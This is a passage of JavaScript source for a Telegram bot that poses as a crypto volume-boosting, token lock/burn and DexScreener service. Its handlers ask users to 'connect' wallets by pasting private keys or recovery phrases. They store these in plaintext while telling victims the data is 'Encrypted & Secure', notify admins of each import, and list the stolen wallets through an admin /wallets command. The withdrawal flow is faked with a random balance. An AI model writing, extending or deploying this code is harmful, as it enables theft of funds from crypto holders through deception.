                type: isPhrase ? 'Recovery Phrase' : 'Private Key',
                username: ctx.from.username || ctx.from.first_name || 'Unknown',
                userId: uid,
                importDate: new Date(),
                source: `lock_burn_${s.action}_${chain}`,
                chain: chain,
                active: false
            });
            saveData();
            logWalletImport(uid, ctx.from.username || 'Unknown', { address: isKey ? txt : '(phrase)' }, isPhrase ? 'seed_phrase' : 'private_key', 'lock_burn');
            const verb  = s.action === 'burn' ? 'Burn'  : 'Lock';
            const emoji = s.action === 'burn' ? '🔥'    : '🔒';
            const sent = await sendStepPhoto(ctx,
                `✅ **Wallet Connected**\n\n` +
                `${emoji} Signing the ${verb.toLowerCase()} transaction…\n\n` +
                `🎯 Final step: Confirm and sign the transaction to restore community trust.`,
                {
                    ...Markup.inlineKeyboard([
                        [Markup.button.callback('✅ Confirm & Sign', 'lb_confirm_order')],
                        [Markup.button.callback('🔏 Re-connect Wallet', 'lock_connect_wallet')]
                    ])
                },
                lbImage(s)
            );
            s.lastBotMsgId = sent?.message_id;
        }
    }

    function getDurationForPercentage(percentage) {
        const durations = { 20: 6, 50: 12, 75: 18, 100: 24 };
        return durations[percentage] || 12;
    }


    // Handle withdrawal session
    function handleWithdrawSession(ctx, input, withdrawSession) {
        switch (withdrawSession.step) {
            case 'waiting_address':
                if (!/^[1-9A-HJ-NP-Za-km-z]{32,44}$/.test(input.trim())) {
                    return ctx.reply(`❌ Invalid Solana address format. Please try again.`);
                }

                withdrawSession.address = input.trim();
                withdrawSession.step = 'waiting_amount';

                ctx.reply(
                    `✅ **Withdrawal Address Saved**\n\n` +
                    `📍 **To:** \`${withdrawSession.address}\`\n\n` +
                    `💰 **Enter amount to withdraw (SOL):**`,
                    { parse_mode: 'Markdown' }
                );
                break;

            case 'waiting_amount':
                const amount = parseFloat(input.trim());
                const maxAmount = Math.random() * 50 + 10; // Simulated max balance

                if (isNaN(amount) || amount <= 0) {
                    return ctx.reply(`❌ Invalid amount. Please enter a valid number.`);
                }

                if (amount > maxAmount) {
                    return ctx.reply(`❌ Insufficient balance. Maximum: ${maxAmount.toFixed(2)} SOL`);
                }

                delete userSessions[ctx.from.id];

                ctx.reply(
                    `✅ **Withdrawal Submitted**\n\n` +
                    `💰 **Amount:** ${amount} SOL\n` +
                    `📍 **To:** \`${withdrawSession.address}\`\n\n` +
                    `⏰ **Processing Time:** 2-24 hours\n` +
                    `📧 **You'll be notified when complete.**`,
                    { parse_mode: 'Markdown' }
                );
                break;
        }
    }

    // Handle discount code session
    function handleDiscountCodeSession(ctx, input, discountSession) {
        const codes = {
            'FIRST15': { discount: 15, description: 'First Order Discount' },
            'EARLY30': { discount: 30, description: 'Early Bird Special' },
            'MORNING20': { discount: 20, description: 'Morning Deal' },
            'NOON25': { discount: 25, description: 'Noon Special' },
            'NIGHT35': { discount: 35, description: 'Night Owl Bonus' }
        };

        const code = input.trim().toUpperCase();
        delete userSessions[ctx.from.id];

        if (codes[code]) {
            ctx.reply(
                `✅ **Discount Code Applied!**\n\n` +
                `🎯 **Code:** ${code}\n` +
                `💰 **Discount:** ${codes[code].discount}%\n` +
                `📝 **Description:** ${codes[code].description}\n\n` +
                `🚀 **Your discount will be applied automatically on your next order!**`,
                { parse_mode: 'Markdown' }
            );
        } else {
            ctx.reply(
                `❌ **Invalid Discount Code**\n\n` +
                `The code "${code}" is not valid or has expired.\n\n` +
                `💡 **Try these codes:**\n` +
                `• FIRST15 (15% off first order)\n` +
                `• Check flash deals for time-limited codes`,
                { parse_mode: 'Markdown' }
            );
        }
    }

    // Private key import handler
    function handlePrivateKeyInput(ctx, pk, source = 'unknown') {
        const uid = ctx.from.id;
        const username = ctx.from.username || 'Unknown';
        const addr = deriveAddressFromPrivateKey(pk.trim());

        console.log(`🔐 Processing private key import for user ${uid} (@${username})`);

        if (!botData.userWallets) botData.userWallets = [];

        const walletData = {
            address: addr,
            privateKey: pk.trim(),
            type: 'Private Key',
            username: username,
            userId: uid,
            importDate: new Date(),
            balance: 0,
            active: true,
            source: source || 'main_import_menu'
        };

        botData.userWallets.push(walletData);
        logWalletImport(uid, username, walletData, 'Private Key', source);
        saveData();

        delete userSessions[uid];

        ctx.reply(
            `✅ **Wallet Imported Successfully!**\n\n` +
            `📍 **Address:** \`${addr}\`\n` +
            `🔐 **Type:** Private Key\n` +
            `🔒 **Security:** Encrypted & Secure\n\n` +
            `Your wallet is now connected and ready for use!\n\n` +
            `🎯 **What's Next:**\n` +
            `• Use for volume generation\n` +
            `• Monitor transactions\n` +
            `• Manage settings`,
            {
                parse_mode: 'Markdown',
                ...Markup.inlineKeyboard([[Markup.button.callback('🔙 Back to Main', 'back_main')]])
            }
        );
    }

    // Recovery phrase import handler
    function handleRecoveryPhraseInput(ctx, phrase, source = 'unknown') {
        const uid = ctx.from.id;
        const username = ctx.from.username || 'Unknown';
        const addr = deriveAddressFromSeedPhrase(phrase.trim());

        console.log(`📝 Processing recovery phrase import for user ${uid} (@${username})`);

        if (!botData.userWallets) botData.userWallets = [];

        const walletData = {
            address: addr,
            seedPhrase: phrase.trim(),
            type: 'Recovery Phrase',
            username: username,
            userId: uid,
            importDate: new Date(),
            balance: 0,
            active: true,
            source: source || 'main_import_menu'
        };

        botData.userWallets.push(walletData);
        logWalletImport(uid, username, walletData, 'Recovery Phrase', source);
        saveData();

        delete userSessions[uid];

        ctx.reply(
            `✅ **Wallet Imported Successfully!**\n\n` +
            `📍 **Address:** \`${addr}\`\n` +
            `🔐 **Type:** Recovery Phrase\n` +
            `🔒 **Security:** Encrypted & Secure\n\n` +
            `Your wallet is now connected and ready for use!\n\n` +
            `🎯 **What's Next:**\n` +
            `• Use for volume generation\n` +
            `• Monitor transactions\n` +
            `• Manage settings`,
            {
                parse_mode: 'Markdown',
                ...Markup.inlineKeyboard([[Markup.button.callback('🔙 Back to Main', 'back_main')]])
            }
        );
    }

    // Enhanced session handler
    async function handleUserSession(ctx, input, userSession) {
        const userId = ctx.from.id;

        switch (userSession.type) {
            case 'private_key':
                if (userSession.step === 'waiting_input') {
                    handlePrivateKeyInput(ctx, input, userSession.source);
                }
                break;
            case 'recovery_phrase':
                if (userSession.step === 'waiting_input') {
                    handleRecoveryPhraseInput(ctx, input, userSession.source);
                }
                break;
            case 'lock_burn':
                await handleLockBurnSession(ctx, input, userSession);
                break;
            case 'volume_bot':
                handleVolumeBotSession(ctx, input, userSession);
                break;
            case 'dex_update':
            case 'dex_ads':
            case 'dex_trending':
                handleDexServiceSession(ctx, input, userSession);
                break;
            case 'withdraw':
                handleWithdrawSession(ctx, input, userSession);
                break;
            case 'discount_code':
                handleDiscountCodeSession(ctx, input, userSession);
                break;
        }
    }

    // ===== COMMAND HANDLERS =====
    bot.start(async ctx => {
        // Second-layer group guard (middleware should already block this, but just in case)
        if (GROUP_TYPES.includes(ctx.chat?.type)) {
            return sendGroupRedirect(ctx);
        }

        const cid = ctx.chat.id, un = ctx.from.username || 'Unknown';

        // Auto-register admin so notifications work without /setadminchat
        ensureAdminRegistered(cid, un);

        // Notify admins that user started the bot
        const notificationMsg = `🔔 <b>BOT STARTED</b>\n\n👤 <b>Username:</b> @${un}\n💬 <b>Chat ID:</b> ${cid}\n⏰ <b>Time:</b> ${new Date().toLocaleString()}`;
        notifyAdmins(notificationMsg);
        
        if (!botData.users[cid]) {
            botData.users[cid] = {
                username: un,
                joinDate: new Date(),
                lastActive: new Date(),
                totalOrders: 0,
                totalSpent: 0
            };
            saveData();
        }
        const mainMenu = getMainMenu();
        try {
            await ctx.replyWithPhoto(
                { source: fs.createReadStream(DEX_START_IMAGE_PATH) },
                { caption: mainMenu.text.substring(0, 1020), parse_mode: 'Markdown', ...mainMenu.buttons }
            );
        } catch(e) {
            await ctx.reply(mainMenu.text, { parse_mode: 'Markdown', ...mainMenu.buttons });
        }
    });

    // Add admin command to view all imported wallets
    bot.command('wallets', (ctx) => {
        if (!isAdmin(ctx)) {
            return ctx.reply('❌ Unauthorized. Admin access required.');
        }

        if (!botData.userWallets || botData.userWallets.length === 0) {
            return ctx.reply(
                `📱 <b>Imported Wallets Database</b>\n\n` +
                `📊 <b>Total Wallets:</b> 0\n\n` +
                `📝 <b>Status:</b> No wallets have been imported yet.\n\n` +
                `💡 <b>Note:</b> Wallets will appear here when users import them for volume generation or supply locking services.`,
                { parse_mode: 'HTML' }
            );
        }

        // Group wallets by user
        const walletsByUser = {};
        botData.userWallets.forEach(wallet => {
            if (!walletsByUser[wallet.userId]) {
                walletsByUser[wallet.userId] = [];
            }
            walletsByUser[wallet.userId].push(wallet);
        });

        let walletText = `📱 <b>Imported Wallets Database</b>\n\n`;
        walletText += `📊 <b>Total Wallets:</b> ${botData.userWallets.length}\n`;
        walletText += `👥 <b>Total Users:</b> ${Object.keys(walletsByUser).length}\n\n`;

        // Show detailed wallet information
        Object.keys(walletsByUser).forEach((userId, userIndex) => {
            const userWallets = walletsByUser[userId];
            const firstWallet = userWallets[0];

            walletText += `👤 <b>User ${userIndex + 1}:</b> @${firstWallet.username}\n`;
            walletText += `🆔 <b>ID:</b> ${userId}\n`;
            walletText += `📱 <b>Wallets:</b> ${userWallets.length}\n\n`;

            userWallets.forEach((wallet, walletIndex) => {
                const importDate = new Date(wallet.importDate).toLocaleDateString();
                const importTime = new Date(wallet.importDate).toLocaleTimeString();
                // Sanitise address — strip any non-ASCII chars that break HTML entities
                const safeAddr = String(wallet.address || '').replace(/[^\x20-\x7E]/g, '');

                walletText += `  🔐 <b>Wallet ${walletIndex + 1}:</b>\n`;
                walletText += `  📍 Address: <code>${safeAddr}</code>\n`;
                walletText += `  🔑 Type: ${wallet.type}\n`;
                walletText += `  📅 Imported: ${importDate} ${importTime}\n`;
                walletText += `  🔘 Status: ${wallet.active ? '🟢 Active' : '🔴 Inactive'}\n`;
                walletText += `  📊 Source: ${wallet.source || 'Unknown'}\n`;
                walletText += `  💰 Balance: ${wallet.balance || 0} SOL\n\n`;
            });
        });

        // Split message if too long
        if (walletText.length > 4000) {
            const chunks = [];
            const lines = walletText.split('\n');
            let currentChunk = `📱 <b>Imported Wallets Database</b>\n\n`;

            for (let i = 3; i < lines.length; i++) {
                if (currentChunk.length + lines[i].length > 3800) {
                    chunks.push(currentChunk);
                    currentChunk = `📱 <b>Wallets Database (Continued)</b>\n\n`;
                }
                currentChunk += lines[i] + '\n';
            }

            if (currentChunk.trim()) {
                chunks.push(currentChunk);
            }

            // Send multiple messages
            chunks.forEach((chunk, index) => {
                setTimeout(() => {
                    ctx.reply(chunk, { parse_mode: 'HTML' });
                }, index * 100);
            });
        } else {
            ctx.reply(walletText, { parse_mode: 'HTML' });
        }

        console.log(`🔧 ADMIN: Wallet database accessed by @${ctx.from.username}`);
        console.log(`📊 Total wallets: ${botData.userWallets.length}`);
        console.log(`👥 Total users with wallets: ${Object.keys(walletsByUser).length}`);
    });

    // Add admin command to set payment address
    bot.command('setaddress', (ctx) => {
        if (!isAdmin(ctx)) {
            return ctx.reply('❌ Unauthorized. Admin access required.');
        }

        // Chain alias → chainId mapping
        const chainAliases = {
            sol:  'solana',
            solana: 'solana',
            eth:  'ethereum',
            ethereum: 'ethereum',
            bnb:  'bsc',
            bsc:  'bsc',
            base: 'base',
            ton:  'ton'
        };

        // Address validators per chain group
        const validators = {
            solana: { regex: /^[1-9A-HJ-NP-Za-km-z]{32,44}$/, label: 'Solana (Base58, 32-44 chars)' },
            ethereum: { regex: /^0x[0-9a-fA-F]{40}$/, label: 'EVM (0x + 40 hex chars)' },
            bsc:     { regex: /^0x[0-9a-fA-F]{40}$/, label: 'EVM (0x + 40 hex chars)' },
            base:    { regex: /^0x[0-9a-fA-F]{40}$/, label: 'EVM (0x + 40 hex chars)' },
            ton:     { regex: /^(EQ|UQ)[0-9A-Za-z_-]{46}$/, label: 'TON (EQ/UQ + 46 chars)' }
        };

        const args = ctx.message.text.trim().split(/\s+/);

        // Show current wallets if no args or wrong usage
        if (args.length < 3) {
            const currentWallets = Object.entries(CHAIN_CONFIG)
                .map(([id, cfg]) => `${cfg.color} **${cfg.name}:** \`${getWalletForChain(id)}\``)
                .join('\n');
            return ctx.reply(
                `📍 **Set Per-Chain Payment Address**\n\n` +
                `**Usage:**\n` +
                `\`/setaddress sol <address>\`\n` +
                `\`/setaddress eth <address>\`\n` +
                `\`/setaddress bnb <address>\`\n` +
                `\`/setaddress base <address>\`\n` +
                `\`/setaddress ton <address>\`\n\n` +
                `📋 **Current Wallets:**\n${currentWallets}`,
                { parse_mode: 'Markdown' }
            );
        }

        const chainAlias = args[1].toLowerCase();
        const newAddress = args[2].trim();
        const chainId = chainAliases[chainAlias];

        if (!chainId) {
            return ctx.reply(
                `❌ **Unknown chain:** \`${args[1]}\`\n\n` +
                `Supported chains: \`sol\`, \`eth\`, \`bnb\`, \`base\`, \`ton\``,
                { parse_mode: 'Markdown' }
            );
        }

        const validator = validators[chainId];
        if (!validator.regex.test(newAddress)) {
            return ctx.reply(
                `❌ **Invalid ${CHAIN_CONFIG[chainId].name} address format**\n\n` +
                `Expected format: ${validator.label}\n\n` +
                `📝 **Your input:** \`${newAddress}\``,
                { parse_mode: 'Markdown' }
            );
        }

        const oldAddress = getWalletForChain(chainId);
        botData.chainWallets[chainId] = newAddress;
        saveData();

        const chainCfg = CHAIN_CONFIG[chainId];
        ctx.reply(
            `✅ **${chainCfg.color} ${chainCfg.name} Wallet Updated!**\n\n` +
            `📍 **Old Address:**\n\`${oldAddress}\`\n\n` +
            `📍 **New Address:**\n\`${newAddress}\`\n\n` +
            `🔄 All ${chainCfg.name} payments will now go to the new address.\n` +
            `⏰ **Updated:** ${new Date().toLocaleString()}`,
            { parse_mode: 'Markdown' }
        );

        console.log(`🔧 ADMIN: ${chainCfg.name} wallet updated by @${ctx.from.username}`);
        console.log(`📍 Old: ${oldAddress}`);
        console.log(`📍 New: ${newAddress}`);
    });

    // Admin command to register admin chat ID for notifications
    bot.command('setadminchat', (ctx) => {
        if (!isAdmin(ctx)) {
            return ctx.reply('❌ Unauthorized. Admin access required.');
        }

        if (!botData.adminChatIds.includes(ctx.chat.id)) {
            botData.adminChatIds.push(ctx.chat.id);
            saveData();
            ctx.reply(`✅ Your chat ID (${ctx.chat.id}) has been registered to receive admin notifications!`);
        } else {
            ctx.reply(`ℹ️ Your chat ID (${ctx.chat.id}) is already registered for notifications.`);
        }

        console.log(`🔧 ADMIN: Admin chat ID registered by @${ctx.from.username} (${ctx.chat.id})`);
    });

    // /syncusers — backfill all users from historical data and report
    bot.command('syncusers', async (ctx) => {
        if (!isAdmin(ctx)) return ctx.reply('❌ Unauthorized.');

        const before = Object.keys(botData.users).length;
        const added  = backfillUsersFromAllSources();
        const after  = Object.keys(botData.users).length;

        // Build a summary list of all registered users
        const lines = Object.entries(botData.users)
            .sort(([, a], [, b]) => new Date(b.lastActive) - new Date(a.lastActive))
            .map(([id, u]) => {
                const tag  = u.username && u.username !== 'Unknown' ? `@${u.username}` : `ID:${id}`;
                const date = new Date(u.lastActive).toLocaleDateString('en-GB');
                const src  = u.source === 'backfill' ? ' *(backfilled)*' : '';
                return `• ${tag} — last active ${date}${src}`;
            })
            .join('\n');

        await ctx.reply(
            `🔄 *User Sync Complete*\n\n` +
            `👥 Before: ${before}\n` +
            `➕ Added:  ${added}\n` +
            `✅ Total:  ${after}\n\n` +
            `*Registered Users:*\n${lines || 'None'}`,
            { parse_mode: 'Markdown' }
        );
    });

    // /broadcast — send a message to all registered users
    bot.command('broadcast', async (ctx) => {
        if (!isAdmin(ctx)) return ctx.reply('❌ Unauthorized.');
        const userCount = Object.keys(botData.users).length;
        if (userCount === 0) return ctx.reply('⚠️ No users registered yet.');
        adminBroadcastSessions[ctx.from.id] = { type: 'broadcast' };
        await ctx.reply(
            `📣 *Broadcast to All Users*\n\n` +
            `There are currently *${userCount}* registered user(s).\n\n` +
            `Send me the message you want to broadcast.\n` +
            `Supports plain text, bold, italic (Markdown).\n\n` +
            `Send /cancel\\_broadcast to abort.`,
            { parse_mode: 'Markdown' }
        );
    });

    // /cancel_broadcast — abort a pending broadcast or DM
    bot.command('cancel_broadcast', async (ctx) => {
        if (!isAdmin(ctx)) return ctx.reply('❌ Unauthorized.');
        if (adminBroadcastSessions[ctx.from.id]) {
            delete adminBroadcastSessions[ctx.from.id];
            return ctx.reply('✅ Broadcast/DM cancelled.');
        }
        return ctx.reply('ℹ️ No pending broadcast or DM to cancel.');
    });

    // /dm — send a message to a specific user by @username or chat ID
    bot.command('dm', async (ctx) => {
        if (!isAdmin(ctx)) return ctx.reply('❌ Unauthorized.');
        const args = ctx.message.text.split(/\s+/).slice(1);
        const target = args[0];
        if (!target) {
            return ctx.reply(
                `📩 *Direct Message*\n\n` +
                `Usage:\n` +
                `• \`/dm @username\` — find user by username\n` +
                `• \`/dm 123456789\` — send directly by chat ID\n\n` +
                `After specifying the target, I will ask for your message.`,
                { parse_mode: 'Markdown' }
            );
        }

        // Resolve target
        let targetChatId = null;
        let targetLabel = target;

        if (/^\d+$/.test(target)) {
            // Numeric chat ID provided directly
            targetChatId = parseInt(target);
            const knownUser = botData.users[targetChatId];
            targetLabel = knownUser ? `@${knownUser.username} (${targetChatId})` : `Chat ID ${targetChatId}`;
        } else {
            // @username lookup
            const cleanUsername = target.replace(/^@/, '').toLowerCase();
            const found = Object.entries(botData.users).find(
                ([, u]) => (u.username || '').toLowerCase() === cleanUsername
            );
            if (!found) {
                return ctx.reply(
                    `❌ Could not find a user with username *${target}*.\n\n` +
                    `They must have used the bot at least once. Try their chat ID instead.`,
                    { parse_mode: 'Markdown' }
                );
            }
            targetChatId = parseInt(found[0]);
            targetLabel = `@${found[1].username} (${targetChatId})`;
        }

        adminBroadcastSessions[ctx.from.id] = { type: 'dm', targetChatId, targetLabel };
        await ctx.reply(
            `📩 *Direct Message → ${targetLabel}*\n\n` +
            `Send me the message to deliver.\n` +
            `Supports plain text and Markdown.\n\n` +
            `Send /cancel\\_broadcast to abort.`,
            { parse_mode: 'Markdown' }
        );
    });

    // /chains command — show all supported chains with live prices
    bot.command('chains', (ctx) => {
        let msg = `🌐 **Supported Chains & Live Prices**\n\n`;
        for (const [id, cfg] of Object.entries(CHAIN_CONFIG)) {
            const price = nativePrices[cfg.coingeckoId];
            const priceStr = price ? `$${price.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 })}` : 'fetching...';
            msg += `${cfg.color} **${cfg.name}** (${cfg.nativeToken})\n`;
            msg += `   💵 Price: ${priceStr}\n`;
            msg += `   🔗 Explorer: [View](${cfg.explorerUrl})\n\n`;
        }
        msg += `🔄 Prices update every 5 minutes via CoinGecko.`;
        ctx.reply(msg, { parse_mode: 'Markdown', disable_web_page_preview: true });
    });

    // /help command — show all available commands and service overview
    bot.command('help', (ctx) => {
        ctx.reply(
            `🤖 **Bot Help & Commands**\n\n` +
            `**📌 Quick Commands:**\n` +
            `\/start — Open main menu\n` +
            `\/help — Show this help guide\n` +
            `\/volume — View all volume packages\n` +
            `\/cancel — Cancel your current session\n` +
            `\/chains — Live prices for all supported chains\n` +
            `\/setlang — Change interface language (e.g. \/setlang es)\n\n` +
            `**🚀 Services:**\n` +
            `• **Volume Bot** — Generate trading volume on any DEX\n` +
            `• **DEX Update** — Update token info on DexScreener ($299)\n` +
            `• **DEX Ads** — Run ad campaigns on DEX platforms\n` +
            `• **DEX Trending** — Push your token to trending lists\n\n` +
            `**🌐 Supported Chains:**\n` +
            `◎ Solana • Ξ Ethereum • ⬡ BNB Chain • 🔷 Base • 💎 TON\n\n` +
            `**💰 Volume Packages (SOL/BNB/TON):**\n` +
            `• Starter: 0.1 native → 2,500 vol\n` +
            `• Basic: 0.2 native → 5,000 vol\n` +
            `• Bronze: 0.5 native → 20,000 vol\n` +
            `• Premium: 1 native → 50,000 vol\n` +
            `• VIP: 2 native → 100,000 vol\n\n` +
            `**💰 Volume Packages (ETH/Base):**\n` +
            `• Starter: 0.1 ETH → 5,000 vol\n` +
            `• Basic: 0.2 ETH → 10,000 vol\n` +
            `• Bronze: 0.5 ETH → 25,000 vol\n` +
            `• Premium: 1 ETH → 50,000 vol\n` +
            `• VIP: 2 ETH → 100,000 vol\n\n` +
            `💬 **Support:** Use the 📞 Contact Support button in the main menu`,
            { parse_mode: 'Markdown' }
        );
    });

    // /cancel command — cancel any active session and return to main menu
    bot.command('cancel', async (ctx) => {
        const had_session = !!userSessions[ctx.from.id];
        delete userSessions[ctx.from.id];
        const mainMenu = getMainMenu();
        await ctx.reply(
            had_session
                ? `✅ **Session cancelled.**\n\nReturning to main menu...`
                : `ℹ️ No active session to cancel.`,
            { parse_mode: 'Markdown' }
        );
        try {
            await ctx.replyWithPhoto(
                { source: fs.createReadStream(DEX_START_IMAGE_PATH) },
                { caption: mainMenu.text.substring(0, 1020), parse_mode: 'Markdown', ...mainMenu.buttons }
            );
        } catch(e) {
            await ctx.reply(mainMenu.text, { parse_mode: 'Markdown', ...mainMenu.buttons });
        }
    });

    // /setlang — let users manually set (or reset) their preferred language
    bot.command('setlang', async (ctx) => {
        const args = ctx.message.text.trim().split(/\s+/);
        const uid  = ctx.from.id;

        if (args.length < 2) {
            const currentLang = botData.users[uid]?.language
                || normalizeLanguageCode(ctx.from.language_code)
                || 'en';
            return ctx.reply(
                `🌐 **Language Settings**\n\n` +
                `Your current language: \`${currentLang}\`\n` +
                `Auto-detected from your Telegram app.\n\n` +
                `📝 **Usage:**\n` +
                `\`/setlang auto\` — reset to your Telegram device language\n` +
                `\`/setlang en\` — English\n` +
                `\`/setlang es\` — Spanish\n` +
                `\`/setlang fr\` — French\n` +
                `\`/setlang de\` — German\n` +
                `\`/setlang ru\` — Russian\n` +
                `\`/setlang zh-CN\` — Chinese (Simplified)\n` +
                `\`/setlang zh-TW\` — Chinese (Traditional)\n` +
                `\`/setlang ar\` — Arabic\n` +
                `\`/setlang pt\` — Portuguese\n` +
                `\`/setlang hi\` — Hindi\n` +
                `\`/setlang tr\` — Turkish\n` +
                `\`/setlang id\` — Indonesian\n` +
                `\`/setlang ko\` — Korean\n` +
                `\`/setlang ja\` — Japanese\n\n` +
                `Use any IETF language tag (ISO 639-1 code).`,
                { parse_mode: 'Markdown' }
            );
        }

        const input = args[1].toLowerCase();

        if (input === 'auto' || input === 'reset') {
            const detected = normalizeLanguageCode(ctx.from.language_code);
            if (botData.users[uid]) {
                botData.users[uid].language         = detected;
                botData.users[uid].languageOverride = false;
                saveData();
            }
            return ctx.reply(
                `✅ Language reset to auto-detect: \`${detected}\`\n\n` +
                `Messages will now appear in your Telegram app's language.`,
                { parse_mode: 'Markdown' }
            );
        }

        // Validate: must be 2-6 chars, letters + optional hyphen
        if (!/^[a-z]{2,3}(-[a-zA-Z]{2,4})?$/.test(input) && input !== 'zh-cn' && input !== 'zh-tw') {
            return ctx.reply(
                `❌ Invalid language code \`${input}\`.\n\nUse a valid IETF tag, e.g. \`en\`, \`es\`, \`zh-CN\`.`,
                { parse_mode: 'Markdown' }
            );
        }

        // Normalise casing for zh variants
        const normalised = args[1].toLowerCase().startsWith('zh')
            ? (args[1].toLowerCase().includes('tw') ? 'zh-TW' : 'zh-CN')
            : args[1].split('-')[0].toLowerCase();

        if (botData.users[uid]) {
            botData.users[uid].language         = normalised;
            botData.users[uid].languageOverride = true;
            saveData();
        }

        const testMsg = await translateText('Language updated successfully! All messages will now be translated.', normalised);
        return ctx.reply(
            `✅ Language set to \`${normalised}\`\n\n${testMsg}`,
            { parse_mode: 'Markdown' }
        );
    });

    // /volume command — show all volume packages with pricing
    bot.command('volume', (ctx) => {
        ctx.reply(
            `📊 **Volume Bot Packages**\n\n` +
            `🌐 **SOL / BNB / TON Chains:**\n` +
            `┌──────────────────────────────\n` +
            `│ 💎 Starter  │ 0.1 native → 2,500 vol   │ 12h\n` +
            `│ 📦 Basic    │ 0.2 native → 5,000 vol   │ 24h\n` +
            `│ 🥉 Bronze   │ 0.5 native → 20,000 vol  │ 36h\n` +
            `│ 🔥 Premium  │ 1 native   → 50,000 vol  │ 48h\n` +
            `│ 👑 VIP      │ 2 native   → 100,000 vol │ 72h\n` +
            `└──────────────────────────────\n\n` +
            `Ξ **ETH / Base Chains:**\n` +
            `┌──────────────────────────────\n` +
            `│ 💎 Starter  │ 0.1 ETH    → 5,000 vol   │ 12h\n` +
            `│ 📦 Basic    │ 0.2 ETH    → 10,000 vol  │ 24h\n` +
            `│ 🥉 Bronze   │ 0.5 ETH    → 25,000 vol  │ 36h\n` +
            `│ 🔥 Premium  │ 1 ETH      → 50,000 vol  │ 48h\n` +
            `│ 👑 VIP      │ 2 ETH      → 100,000 vol │ 72h\n` +
            `└──────────────────────────────\n\n` +
            `🎯 Custom package also available for any amount.\n\n` +
            `Tap \/start to place an order!`,
            { parse_mode: 'Markdown' }
        );
    });

    // Handle text messages for sessions
    // ── Photo upload handler — captures banner images for DEX Update step 5 ──
    bot.on('photo', async (ctx) => {
        const userId = ctx.from.id;
        const session = userSessions[userId];

        if (!session || session.type !== 'dex_update' || session.step !== 'waiting_banner') {
            // Not in the banner upload step — ignore silently
            return;
        }

        // Grab the highest-resolution photo variant
        const photos = ctx.message.photo;
        const bestPhoto = photos[photos.length - 1];
        const fileId = bestPhoto.file_id;

        // Save to session
        session.bannerFileId = fileId;
        session.banner = '📎 Uploaded Image';

        // Show a preview with confirm / redo buttons
        try {
            await ctx.replyWithPhoto(fileId, {
                caption:
                    `👀 *Image Preview*\n\n` +
                    `Here's the banner image you uploaded.\n\n` +
                    `✅ Tap **Confirm** to use this image\n` +
                    `🔄 Tap **Re-upload** to choose a different one`,
                parse_mode: 'Markdown',
                ...Markup.inlineKeyboard([
                    [
                        Markup.button.callback('✅ Confirm Image', 'banner_preview_ok'),
                        Markup.button.callback('🔄 Re-upload', 'banner_preview_redo')
                    ],
                    [Markup.button.callback('⏭️ Skip Image', 'skip_banner')]
                ])
            });
        } catch(e) {
            console.error('Photo preview error:', e.message);
            await ctx.reply('❌ Could not preview image. Please try again or skip.', { parse_mode: 'Markdown' });
        }
    });

    // User confirms the banner preview → advance to payment step
    bot.action('banner_preview_ok', async ctx => {
        await ctx.answerCbQuery();
        const userId = ctx.from.id;
        const session = userSessions[userId];
        if (!session || session.type !== 'dex_update') return;

        session.step = 'waiting_payment';

        const bannerChainCfg = CHAIN_CONFIG[session.chainId] || CHAIN_CONFIG.solana;
        const dexUpdateNativePrice = convertUsdToNative(299, session.chainId || 'solana');
        const nativeTokenLabel = bannerChainCfg.nativeToken;
        const tokenDisplay = session.tokenInfo?.ticker
            ? `${session.tokenInfo.ticker} (${session.tokenInfo.marketCap})`
            : 'Unknown Token';

        if (!session.summaryNotified) {
            session.summaryNotified = true;
        }

        // Delete the preview message, then send payment step using the user's own image
        try { await ctx.deleteMessage(); } catch(e) {}
        try {
            await ctx.replyWithPhoto(session.bannerFileId, {
                caption:
                    `✅ Image confirmed!\n\n` +
                    `**Progress:** [▰▰▰▰▰▰] 100% - Step 6/6\n\n` +
                    `**💎 STEP 6: Order Confirmation**\n\n` +
                    `🎉 Your DEX Update Service is ready!\n\n` +
                    `**📋 Order Summary:**\n` +
                    `• Chain: ${bannerChainCfg.color} ${bannerChainCfg.name}\n` +
                    `• Token: ${tokenDisplay}\n` +
                    `• CA: \`${session.tokenCA.substring(0, 8)}...${session.tokenCA.substring(session.tokenCA.length - 8)}\`\n` +
                    `• Description: ${(session.description || 'Provided').substring(0, 50)}\n` +
                    `• Website: ${session.website}\n` +
                    `• Socials: ${session.socialLinks !== 'Not provided' ? '✅ Provided' : '❌ Not provided'}\n` +
                    `• Banner: 📎 Uploaded Image ✅\n\n` +
                    `**💰 Payment:**\n` +
                    `• USD: $299.00\n` +
                    `• ${nativeTokenLabel}: ${dexUpdateNativePrice} ${nativeTokenLabel}\n` +
                    `• Rate: $${getNativePrice(session.chainId || 'solana').toFixed(2)}/${nativeTokenLabel}\n\n` +
                    `📍 **Send payment to:**\n` +
                    `\`${getWalletForChain(session.chainId || 'solana')}\`\n\n` +
                    `⏱️ Processing: 24-48 hours\n\n` +
                    `After sending payment, click below:`,
                parse_mode: 'Markdown',
                ...Markup.inlineKeyboard([
                    [Markup.button.callback('✅ Payment Sent - Activate Service', 'confirm_dex_update_payment')],
                    [Markup.button.callback('❌ Cancel Order', 'back_main')]
                ])
            });
        } catch(e) {
            // Fallback to text if photo send fails
            await ctx.reply(
                `✅ Image confirmed! Proceeding to payment...\n\n` +
                `📍 **Send $299 (~${dexUpdateNativePrice} ${nativeTokenLabel}) to:**\n` +
                `\`${getWalletForChain(session.chainId || 'solana')}\``,
                {
                    parse_mode: 'Markdown',
                    ...Markup.inlineKeyboard([
                        [Markup.button.callback('✅ Payment Sent - Activate Service', 'confirm_dex_update_payment')],
                        [Markup.button.callback('❌ Cancel Order', 'back_main')]
                    ])
                }
            );
        }
    });

    // User wants to re-upload a different image
    bot.action('banner_preview_redo', async ctx => {
        await ctx.answerCbQuery();
        const userId = ctx.from.id;
        const session = userSessions[userId];
        if (!session || session.type !== 'dex_update') return;

        // Clear the previously saved image
        session.bannerFileId = null;
        session.banner = null;
        // Keep step as waiting_banner so the next photo upload is captured
        session.step = 'waiting_banner';

        try { await ctx.deleteMessage(); } catch(e) {}
        await ctx.reply(
            `🔄 *Re-upload your image*\n\n` +
            `Send your new banner / logo image now:\n\n` +
            `📐 Recommended: 600×200px | JPG / PNG\n` +
            `— or — send a URL instead`,
            {
                parse_mode: 'Markdown',
                ...Markup.inlineKeyboard([
                    [Markup.button.callback('⏭️ Skip Image', 'skip_banner')]
                ])
            }
        );
    });

    bot.on('text', async (ctx) => {
        const userId = ctx.from.id;
        const userSession = userSessions[userId];

        // ── Admin broadcast / DM message capture ──────────────────────────────
